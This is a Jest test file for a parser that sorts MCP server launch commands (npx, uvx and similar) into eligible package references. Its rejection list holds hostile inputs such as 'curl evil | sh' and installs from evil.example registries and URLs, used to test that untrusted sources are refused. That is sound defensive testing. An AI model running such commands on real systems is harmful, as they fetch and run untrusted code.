import { parseLauncherCommand } from './mcp-launcher';

describe('parseLauncherCommand', () => {
  it.each([
    [['npx', '-y', '@apify/actors-mcp-server'], 'npm', '@apify/actors-mcp-server', null],
    [
      ['npx', '@modelcontextprotocol/server-everything@1.4.0'],
      'npm',
      '@modelcontextprotocol/server-everything',
      '1.4.0',
    ],
    [['npx', '-y', 'pkg@latest', '--flag'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@next'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@2nightly'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@release.x'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@next.x'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@1.x+build'], 'npm', 'pkg', null],
    [['npx', '-y', 'pkg@v1.2.3'], 'npm', 'pkg', '1.2.3'],
    [['npx', '-y', 'pkg@1.2.3+build.5'], 'npm', 'pkg', '1.2.3'],
    [['npx', '-y', '@azure/mcp@3.0.0-beta.21'], 'npm', '@azure/mcp', '3.0.0-beta.21'],
    [['bunx', 'pkg'], 'npm', 'pkg', null],
    [['pnpm', 'dlx', 'pkg@2.0.0'], 'npm', 'pkg', '2.0.0'],
    [['npx.cmd', '-y', 'pkg'], 'npm', 'pkg', null],
    [
      ['uvx', 'awslabs.amazon-keyspaces-mcp-server==0.0.14'],
      'pypi',
      'awslabs.amazon-keyspaces-mcp-server',
      '0.0.14',
    ],
    [['uvx', 'mcp-server-git', '--repository', '/tmp/x'], 'pypi', 'mcp-server-git', null],
    [['uvx', 'pkg@latest'], 'pypi', 'pkg', null],
    [['uvx', '--from', 'mcp-server-foo', 'foo-cmd'], 'pypi', 'mcp-server-foo', null],
    [['uvx', '--from=mcp-server-foo>=1.2', 'foo-cmd'], 'pypi', 'mcp-server-foo', '1.2'],
    [['uvx', '--from=mcp-server-foo==1.2.0rc1', 'foo-cmd'], 'pypi', 'mcp-server-foo', '1.2.0rc1'],
    [
      ['uvx', '--from=mcp-server-foo==1.2.0rc1.post1', 'foo-cmd'],
      'pypi',
      'mcp-server-foo',
      '1.2.0rc1.post1',
    ],
    [
      ['uvx', '--from=mcp-server-foo==1.2.3post1', 'foo-cmd'],
      'pypi',
      'mcp-server-foo',
      '1.2.3post1',
    ],
    [
      ['uvx', '--from=mcp-server-foo==1.2.3-rc.1', 'foo-cmd'],
      'pypi',
      'mcp-server-foo',
      '1.2.3-rc.1',
    ],
    [['uvx', '--from=mcp-server-foo==1.2.*', 'foo-cmd'], 'pypi', 'mcp-server-foo', null],
    [['uv', 'tool', 'run', 'pkg'], 'pypi', 'pkg', null],
  ])('parses %j', (argv, ecosystem, identifier, versionHint) => {
    expect(parseLauncherCommand(argv)).toEqual({
      eligible: true,
      ecosystem,
      identifier,
      versionHint,
    });
  });

  it.each([
    ['python', '-m', 'mcp_server_git'],
    ['node', 'dist/index.js'],
    ['bash', '-c', 'curl evil | sh'],
    ['sh', 'run.sh'],
    ['docker', 'run', '-i', '--rm', 'mcp/brave-search'],
    ['/usr/local/bin/my-mcp'],
    ['./server'],
    ['uv', '--directory', '/x', 'run', 'server'],
    ['npm', 'start'],
    ['pnpm', 'exec', 'pkg'],
    ['npx', '-p', 'other', 'pkg'],
    ['npx', '--registry', 'https://evil.example', 'pkg'],
    ['npx', '-y', 'github:evil/repo'],
    ['npx', '-y', 'https://evil.example/pkg.tgz'],
    ['npx', '-y', './local-pkg'],
    ['npx', '-y', 'pkg@npm:other'],
    ['npx', '-y', '@scope/pkg@npm:other'],
    ['npx', '-y', 'pkg@github:user/repo'],
    ['npx', '-y', 'pkg@https://evil.example/pkg.tgz'],
    ['npx', '-y', 'pkg@file:../local-pkg'],
    ['npx', '-y', 'pkg@^1.2.3'],
    ['npx', '-y', 'pkg@~1.2'],
    ['npx', '-y', 'pkg@1.x'],
    ['npx', '-y', 'pkg@1'],
    ['npx', '-y', 'pkg@1.2'],
    ['npx', '-y', 'pkg@v1.2'],
    ['npx', '-y', 'pkg@1.2.x'],
    ['npx', '-y', 'pkg@v1.x'],
    ['npx', '-y', 'pkg@1.2.x+build'],
    ['npx', '-y', 'pkg@1.x.0-beta'],
    ['npx', '-y', 'pkg@x'],
    ['uvx', '--index-url', 'https://evil.example', 'pkg'],
    ['uvx', '--from', 'git+https://github.com/a/b', 'cmd'],
    ['uvx', '--from', './local', 'cmd'],
    ['uvx', 'pkg @ https://evil.example/pkg.whl'],
    ['npx'],
    ['uvx'],
    [],
  ])('rejects %j', (...argv) => {
    expect(parseLauncherCommand(argv).eligible).toBe(false);
  });
});
